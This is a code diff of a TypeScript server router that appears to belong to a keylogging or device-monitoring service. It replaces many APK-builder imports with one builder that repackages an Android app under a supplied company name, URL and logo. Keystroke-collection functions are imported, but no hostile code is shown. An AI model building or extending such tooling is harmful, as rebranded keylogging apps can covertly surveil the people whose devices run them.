@@ -10,23 +10,7 @@ import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
 import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser } from "./db";
 import { startKeylogSimulator } from "./keylogSimulator";
-import { buildCustomAPK } from "./apk-builder";
-import { generateAPKWrapper } from "./apk-wrapper-generator";
-import { generateSimpleAPKWrapper } from "./apk-wrapper-simple";
-import { buildProfessionalAPK } from "./apk-builder-professional";
-import { buildSimpleProductionAPK } from "./apk-builder-simple-production";
-import { buildCustomizedAPK } from "./apk-builder-customized";
-import { buildCustomizedAPKPreserveSignature } from "./apk-builder-preserve-signature";
-import { buildCustomizedAPKFinalWorking } from "./apk-builder-final-working";
-import { buildCustomizedAPKSimple } from "./apk-builder-simple";
-import { buildCustomizedAPKWorking } from "./apk-builder-working";
-import { buildSimpleCopyAPK } from "./apk-builder-simple-copy";
-import { buildCustomAPKFinal } from "./apk-builder-custom-final";
-import { buildAPKWithJava } from "./apk-builder-java";
-import { buildCustomizedAPKWithApktool } from "./apk-builder-apktool";
-import { buildAdvancedAPK } from "./apk-builder-advanced";
-import { generateMemoryAPKUrl } from "./apk-builder-memory";
-import { buildUltraSimpleAPK } from "./apk-builder-ultra-simple";
+import { buildMemoryAPK } from "./apk-builder-memory";
 import { uploadToGitHubRelease, parseGitHubUrl } from "./github-release-uploader";
 import { sdk } from "./_core/sdk";
 
@@ -151,8 +135,8 @@ export const appRouter = router({
           console.log('[ROUTER] Request origin detected:', requestOrigin);
           console.log('[ROUTER] VITE_APP_DOMAIN env:', process.env.VITE_APP_DOMAIN);
           
-          // Use ULTRA-SIMPLE builder - fast customization without decompiling
-          const result = await buildUltraSimpleAPK({
+          // Use MEMORY builder - fast customization without decompiling
+          const result = await buildMemoryAPK({
             appName: input.companyName,
             appUrl: input.companyUrl,
             logoUrl: input.logoUrl,
